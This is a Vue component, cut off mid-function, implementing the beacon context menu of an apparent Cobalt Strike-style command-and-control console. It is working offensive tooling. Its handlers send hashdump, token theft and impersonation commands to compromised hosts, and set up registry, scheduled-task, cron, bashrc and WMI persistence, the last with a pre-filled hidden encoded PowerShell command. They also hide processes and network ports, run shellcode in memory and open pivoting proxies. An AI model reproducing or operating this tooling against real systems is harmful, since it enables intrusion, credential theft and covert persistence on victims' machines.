<template>
  <Teleport to="body">
    <div
      v-if="visible"
      ref="menuRef"
      class="cs-beacon-ctx-menu cs-font-ui"
      :style="menuPositionStyle"
      @mousedown.stop
      @contextmenu.prevent
    >
      <!-- 1. 会话交互 (Interact) -->
      <div class="ctx-item is-highlight" @mouseenter="activeSub = null" @click="handleInteract">
        <span class="ctx-text">{{ t('ctx.interact') }}</span>
      </div>

      <!-- 2. 回连间隔 (Sleep) -->
      <div class="ctx-item" @mouseenter="activeSub = null" @click="handleSleep">
        <span class="ctx-text">{{ t('ctx.sleep') }}</span>
      </div>

      <!-- 3. 备注 (Note) -->
      <div class="ctx-item" @mouseenter="activeSub = null" @click="handleNote">
        <span class="ctx-text">{{ t('ctx.note') }}</span>
      </div>

      <div class="ctx-divider" />

      <!-- 4. 凭证提权 (Access) ▶ -->
      <div
        class="ctx-item has-sub"
        @mouseenter="onMouseEnterItem('access')"
        @mouseleave="onMouseLeaveItem('access')"
      >
        <span class="ctx-text">{{ t('ctx.access') }}</span>
        <span class="ctx-arrow">▶</span>

        <div
          v-show="activeSub === 'access'"
          class="ctx-sub-menu"
          :style="accessSubStyle"
          @mouseenter="onMouseEnterSub('access')"
          @mouseleave="onMouseLeaveSub('access')"
        >
          <div class="ctx-item" @click="execHashdump">{{ t('ctx.access.hashdump') }}</div>
          <div class="ctx-item" @click="openElevate">{{ t('ctx.access.elevate') }}</div>
          <div class="ctx-item" @click="openMakeToken">{{ t('ctx.access.make_token') }}</div>
          <div class="ctx-item" @click="openStealToken">{{ t('ctx.access.steal_token') }}</div>
          <div class="ctx-item" @click="execRev2Self">{{ t('ctx.access.rev2self') }}</div>
          <div class="ctx-item" @click="execOneliner">{{ t('ctx.access.oneliner') }}</div>
          <div class="ctx-item" @click="execMimikatz">{{ t('ctx.access.mimikatz') }}</div>
          <div class="ctx-item" @click="openSpawn">{{ t('ctx.access.spawn') }}</div>
          <div class="ctx-item" @click="openSpawnAs">{{ t('ctx.access.spawnas') }}</div>
        </div>
      </div>

      <!-- 5. 权限维持 (Persistence) ▶（按目标系统区分 Windows/Linux） -->
      <div
        class="ctx-item has-sub"
        @mouseenter="onMouseEnterItem('persistence')"
        @mouseleave="onMouseLeaveItem('persistence')"
      >
        <span class="ctx-text">{{ t('ctx.persistence') }}</span>
        <span class="ctx-arrow">▶</span>

        <div v-show="activeSub === 'persistence'" class="ctx-sub-menu" :style="persistenceSubStyle">
          <div class="ctx-item" @click="openStartup">{{ isZh ? '开机启动管理(P)...' : 'Startup Persistence(P)...' }}</div>
          <div class="ctx-divider" />
          <template v-if="isLinuxTarget">
            <div class="ctx-item" @click="execPersist('cron')">{{ t('ctx.persistence.cron') }}</div>
            <div class="ctx-item" @click="execPersist('bashrc')">{{ t('ctx.persistence.bashrc') }}</div>
            <div class="ctx-divider" />
            <div class="ctx-item" @click="openHideProcess">{{ t('ctx.persistence.hide_proc') }}</div>
            <div class="ctx-item" @click="restoreHideProcess">{{ t('ctx.persistence.unhide_proc') }}</div>
            <div class="ctx-divider" />
            <div class="ctx-item" @click="openHideNet">{{ t('ctx.persistence.hide_net') }}</div>
            <div class="ctx-item" @click="restoreHideNet">{{ t('ctx.persistence.unhide_net') }}</div>
          </template>
          <template v-else>
            <div class="ctx-item" @click="execPersist('registry')">{{ t('ctx.persistence.registry') }}</div>
            <div class="ctx-item" @click="execPersist('schtasks')">{{ t('ctx.persistence.schtasks') }}</div>
            <div class="ctx-item" @click="execPersist('startup')">{{ t('ctx.persistence.startup') }}</div>
            <div class="ctx-item" @click="openWmiPersist">{{ t('ctx.persistence.wmi') }}</div>
          </template>
        </div>
      </div>

      <!-- 6. 浏览探测 (Explore) ▶ -->
      <div
        class="ctx-item has-sub"
        @mouseenter="onMouseEnterItem('explore')"
        @mouseleave="onMouseLeaveItem('explore')"
      >
        <span class="ctx-text">{{ t('ctx.explore') }}</span>
        <span class="ctx-arrow">▶</span>

        <div
          v-show="activeSub === 'explore'"
          class="ctx-sub-menu"
          :style="exploreSubStyle"
          @mouseenter="onMouseEnterSub('explore')"
          @mouseleave="onMouseLeaveSub('explore')"
        >
          <div class="ctx-item" @click="openBrowserPivot">{{ t('ctx.explore.browser_pivot') }}</div>
          <div class="ctx-item" @click="openDesktopVnc">{{ isZh ? '远程桌面(D)' : 'Remote Desktop(D)' }}</div>
          <div class="ctx-item" @click="openFiles">{{ t('ctx.explore.files') }}</div>
          <div class="ctx-item" @click="execNetView">{{ t('ctx.explore.netview') }}</div>
          <div class="ctx-item" @click="openPortScan">{{ t('ctx.explore.portscan') }}</div>
          <div class="ctx-item" @click="openPids">{{ t('ctx.explore.pids') }}</div>
          <div class="ctx-item" @click="openScreenshots">{{ t('ctx.explore.screenshots') }}</div>
        </div>
      </div>

      <!-- 6. 代理转发 (Pivoting) ▶ -->
      <div
        class="ctx-item has-sub"
        @mouseenter="onMouseEnterItem('pivoting')"
        @mouseleave="onMouseLeaveItem('pivoting')"
      >
        <span class="ctx-text">{{ isZh ? '代理转发(P)' : 'Pivoting(P)' }}</span>
        <span class="ctx-arrow">▶</span>

        <div
          v-show="activeSub === 'pivoting'"
          class="ctx-sub-menu"
          :style="pivotingSubStyle"
          @mouseenter="onMouseEnterSub('pivoting')"
          @mouseleave="onMouseLeaveSub('pivoting')"
        >
          <div class="ctx-item" @click="openSocks">{{ isZh ? '代理转发(S)...' : 'Proxy Pivoting(S)...' }}</div>
          <div class="ctx-item" @click="openListener">{{ isZh ? '转发上线(L)...' : 'Forward Listener(L)...' }}</div>
        </div>
      </div>

      <!-- 6.5 拓展工具 (Extensions) ▶ -->
      <div
        class="ctx-item has-sub"
        @mouseenter="onMouseEnterItem('extensions')"
        @mouseleave="onMouseLeaveItem('extensions')"
      >
        <span class="ctx-text">{{ isZh ? '拓展工具' : 'Extension Tools' }}</span>
        <span class="ctx-arrow">▶</span>

        <div
          v-show="activeSub === 'extensions'"
          class="ctx-sub-menu"
          :style="extensionsSubStyle"
          @mouseenter="onMouseEnterSub('extensions')"
          @mouseleave="onMouseLeaveSub('extensions')"
        >
          <div class="ctx-item" @click="openWindowsTerminal">
            <span>{{ isZh ? 'Windows 终端交互' : 'Windows Terminal' }}</span>
            <span v-if="!isLinuxTarget" style="font-size: 10px; color: #52c41a; margin-left: 6px;">[Win]</span>
            <span v-else style="font-size: 10px; color: var(--cs-text-dim); margin-left: 6px;">[需Win]</span>
          </div>
          <div class="ctx-item" @click="openLinuxTerminal">
            <span>{{ isZh ? 'Linux 终端交互' : 'Linux Terminal' }}</span>
            <span v-if="isLinuxTarget" style="font-size: 10px; color: #52c41a; margin-left: 6px;">[Linux]</span>
            <span v-else style="font-size: 10px; color: var(--cs-text-dim); margin-left: 6px;">[需Linux]</span>
          </div>
          <div class="ctx-item" @click="openTools">{{ t('ctx.explore.tools') }}</div>
          <div class="ctx-item" @click="openDownloads">{{ t('ctx.explore.downloads') }}</div>
        </div>
      </div>

      <div class="ctx-divider" />

      <!-- 7. 会话操作 (Session) ▶ -->
      <div
        class="ctx-item has-sub"
        @mouseenter="onMouseEnterItem('session')"
        @mouseleave="onMouseLeaveItem('session')"
      >
        <span class="ctx-text">{{ t('ctx.session') }}</span>
        <span class="ctx-arrow">▶</span>

        <div
          v-show="activeSub === 'session'"
          class="ctx-sub-menu"
          :style="sessionSubStyle"
          @mouseenter="onMouseEnterSub('session')"
          @mouseleave="onMouseLeaveSub('session')"
        >
          <!-- 颜色标记 (Screenshot 6: 6 horizontal color blocks) -->
          <div
            class="ctx-item has-sub color-item"
            @mouseenter="activeColorSub = true"
            @mouseleave="activeColorSub = false"
          >
            <span class="ctx-text">{{ t('ctx.session.color') }}</span>
            <span class="ctx-arrow">▶</span>

            <div v-show="activeColorSub" class="ctx-color-palette">
              <div
                v-for="c in colorPalette"
                :key="c.value"
                class="color-box"
                :style="{ backgroundColor: c.value }"
                :title="c.label"
                @click.stop="setColor(c.value)"
              />
            </div>
          </div>

          <div class="ctx-item" @click="setGroup">{{ t('ctx.session.group') }}</div>
          <div class="ctx-item" @click="smartAliveCheck">{{ t('ctx.session.check_alive') }}</div>
          <div class="ctx-item" @click="openMigrate">{{ t('ctx.session.migrate') }}</div>
          <div class="ctx-item" @click="disconnectSession">{{ t('ctx.session.disconnect') }}</div>
          <div class="ctx-item" @click="removeSession">{{ t('ctx.session.remove') }}</div>
          <div class="ctx-item ctx-danger" @click="exitSession">{{ t('ctx.session.exit') }}</div>
          <div class="ctx-divider" />
          <div class="ctx-item" @click="cleanupOfflineSessions">{{ t('ctx.session.cleanup_offline') }}</div>
        </div>
      </div>

      <div class="ctx-divider" />

      <!-- 8. 内存执行 / 插件管理 ▶ -->
      <div
        class="ctx-item has-sub"
        @mouseenter="onMouseEnterItem('postexp')"
        @mouseleave="onMouseLeaveItem('postexp')"
      >
        <span class="ctx-text">{{ isZh ? '内存执行' : 'Memory Execution' }}</span>
        <span class="ctx-arrow">▶</span>

        <div
          v-show="activeSub === 'postexp'"
          class="ctx-sub-menu"
          :style="postexpSubStyle"
          @mouseenter="onMouseEnterSub('postexp')"
          @mouseleave="onMouseLeaveSub('postexp')"
        >
          <div class="ctx-item" @click="execAssembly">{{ t('ctx.postexp.assembly') }}</div>
          <div class="ctx-item" @click="execInline">{{ t('ctx.postexp.inline') }}</div>
          <div class="ctx-item" @click="execShellcode">{{ t('ctx.postexp.shellcode') }}</div>
          <div class="ctx-item" @click="execBof">{{ t('ctx.postexp.bof') }}</div>
          <div class="ctx-divider" />
          <div class="ctx-item" @click="execLinuxScript">{{ t('ctx.postexp.script') }}</div>
          <div class="ctx-item" @click="execLinuxBinary">{{ t('ctx.postexp.binary') }}</div>
          <div class="ctx-divider" />
          <div class="ctx-item" @click="openPlugins">{{ t('ctx.postexp.manager') }}</div>
        </div>
      </div>

      <!-- 9. 插件菜单（CNA script menu 动态注册）▶ -->
      <div
        v-if="cnaMenus.length > 0"
        class="ctx-item has-sub"
        @mouseenter="onMouseEnterItem('plugins')"
        @mouseleave="onMouseLeaveItem('plugins')"
      >
        <span class="ctx-text">{{ isZh ? '插件' : 'Plugins' }}</span>
        <span class="ctx-arrow">▶</span>

        <div
          v-show="activeSub === 'plugins'"
          class="ctx-sub-menu"
          :style="pluginSubStyle"
          @mouseenter="onMouseEnterSub('plugins')"
          @mouseleave="onMouseLeaveSub('plugins')"
        >
          <template v-for="menu in cnaMenus" :key="menu.script + '|' + menu.kind">
            <div
              class="ctx-item has-sub"
              @mouseenter="setActivePluginMenu(menu.script + '|' + menu.kind)"
              @click.stop
            >
              <span class="ctx-text">{{ menu.script }}</span>
              <span class="ctx-arrow">▶</span>

              <div
                v-show="activePluginMenu === menu.script + '|' + menu.kind"
                class="ctx-sub-menu"
                :style="nestedSubStyle"
                @mouseenter="setActivePluginMenu(menu.script + '|' + menu.kind)"
              >
                <template v-for="(item, idx) in menu.items" :key="idx">
                  <div v-if="item.separator" class="ctx-divider" />
                  <div
                    v-else-if="item.sub_items && item.sub_items.length"
                    class="ctx-item has-sub"
                    @mouseenter="setActivePluginSub(menu.script + '|' + menu.kind + '|' + item.label)"
                    @mouseleave="setActivePluginSub(null)"
                    @click.stop
                  >
                    <span class="ctx-text">{{ item.label }}</span>
                    <span class="ctx-arrow">▶</span>
                    <div
                      v-show="activePluginSub === menu.script + '|' + menu.kind + '|' + item.label"
                      class="ctx-sub-menu"
                      :style="nestedSubStyle"
                      @mouseenter="setActivePluginSub(menu.script + '|' + menu.kind + '|' + item.label)"
                    >
                      <div
                        v-for="(sub, si) in item.sub_items"
                        :key="si"
                        class="ctx-item"
                        @click="execPluginMenu(menu.kind, [item.label, sub.label])"
                      >
                        {{ sub.label }}
                      </div>
                    </div>
                  </div>
                  <div v-else class="ctx-item" @click="execPluginMenu(menu.kind, [item.label])">
                    {{ item.label }}
                  </div>
                </template>
              </div>
            </div>
          </template>
          <div v-if="menusLoading" class="ctx-item" style="opacity: 0.6">
            {{ isZh ? '加载中...' : 'Loading...' }}
          </div>
          <div v-else-if="cnaMenus.length === 0" class="ctx-item" style="opacity: 0.6">
            {{ isZh ? '无脚本菜单' : 'No script menus' }}
          </div>
        </div>
      </div>
    </div>
  </Teleport>
</template>

<script setup lang="ts">
import { computed, nextTick, onBeforeUnmount, onMounted, ref, watch } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { useWorkspaceStore } from '@/stores/workspace'
import { useClientsStore, type ClientData } from '@/stores/clients'
import { useI18nStore } from '@/stores/i18n'
import ClientAPI from '@/api/clients'
import cnaApi from '@/api/cna'

const props = defineProps<{
  visible: boolean
  x: number
  y: number
  client: ClientData | null
}>()

const emit = defineEmits<{
  (e: 'update:visible', val: boolean): void
}>()

const workspace = useWorkspaceStore()
const clientsStore = useClientsStore()
const i18nStore = useI18nStore()

const isZh = computed(() => i18nStore.isZh)
const t = (key: string, def?: string) => i18nStore.t(key, def)

const menuRef = ref<HTMLElement | null>(null)
const activeSub = ref<string | null>(null)
const activeColorSub = ref(false)

// CNA 插件菜单状态
const cnaMenus = ref<any[]>([])
const menusLoading = ref(false)
const activePluginMenu = ref<string | null>(null)
const activePluginSub = ref<string | null>(null)
let pluginSubTimer: number | null = null
let menusCache: { data: any[]; ts: number } | null = null
const MENUS_CACHE_TTL = 30000

// 方向智能翻转：右键点在屏幕右半区时子菜单向左展开，避免溢出视口
const expandLeft = computed(() => props.x > (typeof window !== 'undefined' ? window.innerWidth * 0.55 : 400))
const pluginSubStyle = computed(() => ({
  left: expandLeft.value ? '-100%' : '100%',
  top: props.y > (typeof window !== 'undefined' ? window.innerHeight * 0.6 : 400) ? '-140px' : '-70px',
}))
const nestedSubStyle = computed(() => ({
  left: expandLeft.value ? '-100%' : '100%',
  top: '-20px',
}))

// 6 Colors from Screenshot 6: White, Light Green, Light Pink, Light Yellow, Grey, Dark Blue
const colorPalette = [
  { value: '#ffffff', label: 'White' },
  { value: '#c8e6c9', label: 'Light Green' },
  { value: '#ffcdd2', label: 'Light Pink' },
  { value: '#fff59d', label: 'Light Yellow' },
  { value: '#9e9e9e', label: 'Grey' },
  { value: '#3f51b5', label: 'Dark Blue' },
]

function getTargetClients(): ClientData[] {
  const selectedUids = workspace.selectedUids
  if (selectedUids.length > 1) {
    return selectedUids
      .map((uid) => clientsStore.getClientByUid(uid))
      .filter((c): c is ClientData => !!c)
  }
  if (props.client) {
    return [props.client]
  }
  return []
}

function getPrimaryClient(): ClientData | null {
  const targets = getTargetClients()
  return targets[0] || props.client
}

function openConsoleForResults(c: ClientData) {
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `beacon:${c.Uid}`,
    title: `beacon: ${label}`,
    component: 'beacon',
    params: { uid: c.Uid },
  })
}

const menuPositionStyle = computed(() => {
  const margin = 10
  const maxW = window.innerWidth - 180
  const maxH = window.innerHeight - 300
  const posX = Math.min(props.x, maxW - margin)
  const posY = Math.min(props.y, maxH - margin)
  return {
    left: `${Math.max(margin, posX)}px`,
    top: `${Math.max(margin, posY)}px`,
  }
})

const accessSubStyle = { top: '0px' }
const exploreSubStyle = { top: '-30px' }
const persistenceSubStyle = { top: '-10px' }

// 目标系统判断（客户端 Os/Computer 形如 "linux" / "darwin" / "(Linux)" / "root" 等）
const isLinuxTarget = computed(() => {
  const c = getPrimaryClient()
  if (!c) return false
  const os = (c.Os || '').toLowerCase()
  const comp = (c.Computer || '').toLowerCase()
  const user = (c.Username || '').toLowerCase()
  const arch = (c.Arch || '').toLowerCase()
  return (
    os.includes('linux') ||
    os.includes('darwin') ||
    os.includes('unix') ||
    comp.includes('(linux)') ||
    comp.includes('linux') ||
    arch.includes('linux') ||
    user === 'root'
  )
})
const pivotingSubStyle = { top: '-20px' }
const extensionsSubStyle = { top: '-30px' }
const sessionSubStyle = { top: '-20px' }
const postexpSubStyle = { top: '-60px' }
const pluginsSubStyle = { top: '-70px' }

// CNA 插件菜单：菜单显示时加载（30s 缓存，先显示缓存再静默刷新）
watch(() => props.visible, (v) => {
  if (v) {
    activePluginMenu.value = null
    activePluginSub.value = null
    loadCnaMenus()
  }
})

let subMenuCloseTimer: number | null = null

function onMouseEnterItem(sub: string) {
  if (subMenuCloseTimer) {
    window.clearTimeout(subMenuCloseTimer)
    subMenuCloseTimer = null
  }
  activeSub.value = sub
}

function onMouseLeaveItem(sub: string) {
  if (subMenuCloseTimer) window.clearTimeout(subMenuCloseTimer)
  subMenuCloseTimer = window.setTimeout(() => {
    if (activeSub.value === sub && !activeColorSub.value) {
      activeSub.value = null
      activePluginMenu.value = null
      activePluginSub.value = null
    }
  }, 280)
}

function onMouseEnterSub(sub: string) {
  if (subMenuCloseTimer) {
    window.clearTimeout(subMenuCloseTimer)
    subMenuCloseTimer = null
  }
  activeSub.value = sub
}

function onMouseLeaveSub(sub: string) {
  onMouseLeaveItem(sub)
}

// 延迟切换子菜单，避免跨级移动闪烁
function setActivePluginMenu(key: string) {
  if (pluginSubTimer) window.clearTimeout(pluginSubTimer)
  if (subMenuCloseTimer) {
    window.clearTimeout(subMenuCloseTimer)
    subMenuCloseTimer = null
  }
  activePluginMenu.value = key
}

function setActivePluginSub(key: string | null) {
  if (pluginSubTimer) window.clearTimeout(pluginSubTimer)
  if (subMenuCloseTimer) {
    window.clearTimeout(subMenuCloseTimer)
    subMenuCloseTimer = null
  }
  if (key) {
    activePluginSub.value = key
  } else {
    pluginSubTimer = window.setTimeout(() => {
      activePluginSub.value = null
    }, 280)
  }
}

async function loadCnaMenus() {
  if (menusCache && Date.now() - menusCache.ts < MENUS_CACHE_TTL) {
    cnaMenus.value = menusCache.data
    // 静默刷新缓存
    refreshCnaMenus(true)
    return
  }
  await refreshCnaMenus(false)
}

async function refreshCnaMenus(silent: boolean) {
  if (!silent) menusLoading.value = true
  try {
    const res = await cnaApi.listMenus()
    const data = res?.data?.data || []
    menusCache = { data, ts: Date.now() }
    cnaMenus.value = data
  } catch {
    if (!menusCache) cnaMenus.value = []
  } finally {
    menusLoading.value = false
  }
}

// 执行 CNA 菜单项；输出已由服务端发布到事件日志面板
async function execPluginMenu(kind: string, path: string[]) {
  const uid = props.client?.Uid || ''
  emit('update:visible', false)
  try {
    const res = await cnaApi.execMenuItem({ uid, kind, path })
    const data = res?.data
    if (data?.error) {
      ElMessage.error('脚本错误: ' + data.error)
      return
    }
    const output = data?.output || []
    if (output.length > 0) {
      ElMessage.success(isZh.value ? `脚本执行完成（${output.length} 行输出，见事件日志）` : `Executed (${output.length} lines, see event log)`)
    } else {
      ElMessage.success(isZh.value ? '脚本执行完成' : 'Executed')
    }
  } catch (err: any) {
    ElMessage.error(isZh.value ? '插件执行失败: ' + (err?.message || '') : 'Plugin exec failed: ' + (err?.message || ''))
  }
}

function close() {
  emit('update:visible', false)
  activeSub.value = null
  activeColorSub.value = false
  if (pluginSubTimer) window.clearTimeout(pluginSubTimer)
  if (subMenuCloseTimer) window.clearTimeout(subMenuCloseTimer)
  activePluginMenu.value = null
  activePluginSub.value = null
}

// 1. Interact
function handleInteract() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `beacon:${c.Uid}`,
    title: isZh.value ? `会话交互: ${label}` : `Beacon: ${label}`,
    component: 'beacon',
    params: { uid: c.Uid },
  })
}

// 2. Sleep
function handleSleep() {
  close()
  const targets = getTargetClients()
  if (!targets.length) return
  workspace.openDialog('sleep', {
    uid: targets[0].Uid,
    uids: targets.map((t) => t.Uid),
    sleep: parseInt(targets[0].Sleep || '5') || 5,
  })
}

// 3. Note
function handleNote() {
  close()
  const targets = getTargetClients()
  if (!targets.length) return
  workspace.openDialog('note', {
    uid: targets[0].Uid,
    uids: targets.map((t) => t.Uid),
    note: targets[0].Note || '',
  })
}

// Access Submenu Handlers
// 以下命令后端/客户端命令表未实现（resolveCommand 会兜底成 shell 命令下发到目标机执行，必然报错），
// 全部诚实化：点击提示未实现，不再下发无效命令。
function notImplemented() {
  close()
  ElMessage.warning(isZh.value ? '该功能未实现（后端/客户端无此命令）' : 'Feature not implemented (no backend/client command)')
}

function execHashdump() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  ClientAPI.sendCmd(c.Uid, 'hashdump')
  openConsoleForResults(c)
  ElMessage.info(isZh.value ? '已发送 hashdump 指令，结果将回显到会话交互控制台' : 'Sent hashdump; results echo to Interact console')
}

function execMimikatz() {
  notImplemented()
}

function openElevate() {
  // 【修复】原调用 workspace.openDialog('elevate') 但 DialogState 无此键、
  // 也无 Elevate 对话框组件,属复制 CS 菜单时的悬空引用;按同文件惯例如实提示
  notImplemented()
}

function openGoldenTicket() {
  notImplemented()
}

function openMakeToken() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  // 输入 user|pass|domain（密码可含空格）
  ElMessageBox.prompt(
    isZh.value ? '输入凭据：用户|密码|域（密码可为空）' : 'Credentials: user|password|domain (password optional)',
    isZh.value ? '创建令牌 (make_token)' : 'Create Token (make_token)',
    {
      confirmButtonText: isZh.value ? '创建并模拟' : 'Create & Impersonate',
      cancelButtonText: isZh.value ? '取消' : 'Cancel',
      inputValue: '|',
      inputPlaceholder: 'administrator|P@ssw0rd|CORP',
    },
  ).then(async ({ value }) => {
    if (!value || value.trim() === '|') {
      ElMessage.warning(isZh.value ? '请输入有效凭据' : 'Enter valid credentials')
      return
    }
    await ClientAPI.sendCmd(c.Uid, `make_token ${value.trim()}`)
    openConsoleForResults(c)
  }).catch(() => {})
}

function openStealToken() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  ElMessageBox.prompt(
    isZh.value ? '输入要窃取令牌的进程 PID：' : 'PID of the process to steal its token:',
    isZh.value ? '窃取令牌 (steal_token)' : 'Steal Token (steal_token)',
    {
      confirmButtonText: isZh.value ? '窃取并模拟' : 'Steal & Impersonate',
      cancelButtonText: isZh.value ? '取消' : 'Cancel',
      inputPattern: /^\d+$/,
      inputErrorMessage: isZh.value ? 'PID 必须为数字' : 'PID must be numeric',
    },
  ).then(async ({ value }) => {
    if (!value) return
    await ClientAPI.sendCmd(c.Uid, `steal_token ${value.trim()}`)
    openConsoleForResults(c)
  }).catch(() => {})
}

function execRev2Self() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  ClientAPI.sendCmd(c.Uid, 'rev2self')
  openConsoleForResults(c)
}

function execOneliner() {
  close()
  workspace.openTab({ id: 'webdelivery', title: isZh.value ? 'Web投递' : 'Web Delivery', component: 'webdelivery' })
}

// ===== 权限维持（Persistence）=====

// execPersist 下发 persist 命令（registry/schtasks/startup/cron/bashrc）
function execPersist(method: string) {
  close()
  const c = getPrimaryClient()
  if (!c) return
  ClientAPI.sendCmd(c.Uid, `persist ${method}`)
  openConsoleForResults(c)
  ElMessage.success(isZh.value ? `已下发 ${method} 持久化` : `${method} persistence tasked`)
}

// openHideProcess Linux 隐藏进程：hideprocess <name>
function openHideProcess() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  ElMessageBox.prompt(
    isZh.value ? '伪装进程名（ps/top 显示名，默认 systemd）:' : 'Masquerade name shown in ps/top (default systemd):',
    isZh.value ? '隐藏进程' : 'Hide Process',
    { confirmButtonText: isZh.value ? '隐藏' : 'Hide', cancelButtonText: isZh.value ? '取消' : 'Cancel', inputValue: 'systemd' },
  ).then(async ({ value }) => {
    const name = (value || 'systemd').trim() || 'systemd'
    await ClientAPI.sendCmd(c.Uid, `hideprocess ${name}`)
    openConsoleForResults(c)
  }).catch(() => {})
}

// openHideNet Linux 隐藏网络连接：hidenet on <port>
function openHideNet() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  ElMessageBox.prompt(
    isZh.value ? '要隐藏的监听端口（1-65535）:' : 'Listening port to hide (1-65535):',
    isZh.value ? '隐藏网络连接' : 'Hide Network',
    {
      confirmButtonText: isZh.value ? '隐藏' : 'Hide',
      cancelButtonText: isZh.value ? '取消' : 'Cancel',
      inputPattern: /^\d+$/,
      inputErrorMessage: isZh.value ? '端口必须为数字' : 'Port must be numeric',
    },
  ).then(async ({ value }) => {
    const port = (value || '').trim()
    if (!port || +port < 1 || +port > 65535) {
      ElMessage.warning(isZh.value ? '无效端口' : 'Invalid port')
      return
    }
    await ClientAPI.sendCmd(c.Uid, `hidenet on ${port}`)
    openConsoleForResults(c)
  }).catch(() => {})
}

// openWmiPersist Windows WMI 持久化：wmi_persist add <cmd>
function openWmiPersist() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  ElMessageBox.prompt(
    isZh.value ? 'WMI 持久化触发命令:' : 'Command triggered by WMI persistence:',
    isZh.value ? 'WMI 持久化' : 'WMI Persistence',
    { confirmButtonText: isZh.value ? '添加' : 'Add', cancelButtonText: isZh.value ? '取消' : 'Cancel', inputValue: 'powershell -nop -w hidden -enc ' },
  ).then(async ({ value }) => {
    const cmd = (value || '').trim()
    if (!cmd) {
      ElMessage.warning(isZh.value ? '命令为空' : 'Command is empty')
      return
    }
    await ClientAPI.sendCmd(c.Uid, `wmi_persist add ${cmd}`)
    openConsoleForResults(c)
  }).catch(() => {})
}

function openSpawn() {
  notImplemented()
}

function openSpawnAs() {
  notImplemented()
}

// Explore Submenu Handlers
function openBrowserPivot() {
  notImplemented()
}

function openDesktopVnc() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `monitor:${c.Uid}`,
    title: isZh.value ? `远程桌面: ${label}` : `Desktop: ${label}`,
    component: 'client-monitor',
    params: { uid: c.Uid },
  })
}

function openFiles() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `files:${c.Uid}`,
    title: isZh.value ? `文件管理: ${label}` : `Files: ${label}`,
    component: 'client-files',
    params: { uid: c.Uid },
  })
}

function execNetView() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  ClientAPI.sendCmd(c.Uid, 'net view')
  openConsoleForResults(c)
  ElMessage.info(isZh.value ? '已发送网络探测指令 (net view)，结果将回显到会话交互控制台' : 'Sent net view; results echo to Interact console')
}

function openPortScan() {
  notImplemented()
}

function openPids() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `pids:${c.Uid}`,
    title: isZh.value ? `进程列表: ${label}` : `Processes: ${label}`,
    component: 'client-pids',
    params: { uid: c.Uid },
  })
}

function openScreenshots() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `screenshots:${c.Uid}`,
    title: isZh.value ? `屏幕截图: ${label}` : `Screenshots: ${label}`,
    component: 'client-screenshots',
    params: { uid: c.Uid },
  })
}

function openWindowsTerminal() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  if (isLinuxTarget.value) {
    ElMessage.warning(
      isZh.value
        ? `当前目标主机 (${c.Computer || c.ExternalIP}) 为 Linux/Unix 系统，无法启动 Windows 终端交互，请选择「Linux 终端交互」`
        : `Target (${c.Computer || c.ExternalIP}) is Linux/Unix. Please select Linux Terminal.`
    )
    return
  }
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `win-term:${c.Uid}`,
    title: isZh.value ? `Windows 终端: ${label}` : `Windows Term: ${label}`,
    component: 'client-terminal',
    params: { uid: c.Uid, os: 'windows' },
  })
}

function openLinuxTerminal() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  if (!isLinuxTarget.value) {
    ElMessage.warning(
      isZh.value
        ? `当前目标主机 (${c.Computer || c.ExternalIP}) 为 Windows 系统，无法启动 Linux 终端交互，请选择「Windows 终端交互」`
        : `Target (${c.Computer || c.ExternalIP}) is Windows. Please select Windows Terminal.`
    )
    return
  }
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `term:${c.Uid}`,
    title: isZh.value ? `Linux 终端: ${label}` : `Linux Term: ${label}`,
    component: 'client-terminal',
    params: { uid: c.Uid, os: 'linux' },
  })
}

function openTools() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `tools:${c.Uid}`,
    title: isZh.value ? `客户端工具: ${label}` : `Tools: ${label}`,
    component: 'client-tools',
    params: { uid: c.Uid },
  })
}

function openDownloads() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `downloads:${c.Uid}`,
    title: isZh.value ? `已下载文件: ${label}` : `Downloads: ${label}`,
    component: 'client-downloads',
    params: { uid: c.Uid },
  })
}

function openStartup() {
  close()
  const c = getPrimaryClient()
  if (!c) return
  const label = `${c.Username}@${c.Computer || c.ExternalIP}`
  workspace.openTab({
    id: `startup:${c.Uid}`,
    title: isZh.value ? `开机启动: ${label}` : `Startup: ${label}`,
    component: 'client-startup',
    params: { uid: c.Uid },
  })
}

// Pivoting Submenu Handlers
function openSocks() {
  close()
  // 统一打开代理转发面板（与视图→代理转发一致，含 SOCKS5/HTTP/TCP/UDP 全部协议）
  workspace.openTab({ id: 'tunnel-proxy', title: isZh.value ? '代理转发' : 'Tunnel & Proxy', component: 'tunnel-proxy' })
}

function openListener() {
  close()
  workspace.openTab({ id: 'forward-listeners', title: isZh.value ? '正向监听' : 'Forward Listeners', component: 'forward-listeners' })
}

function openVpn() {
  close()
  workspace.openTab({ id: 'tunnel-proxy', title: isZh.value ? '代理转发' : 'Tunnel Proxy', component: 'tunnel-proxy' })
}

// Session Submenu Handlers
function setColor(color: string) {
  close()
  const targets = getTargetClients()
  for (const c of targets) {
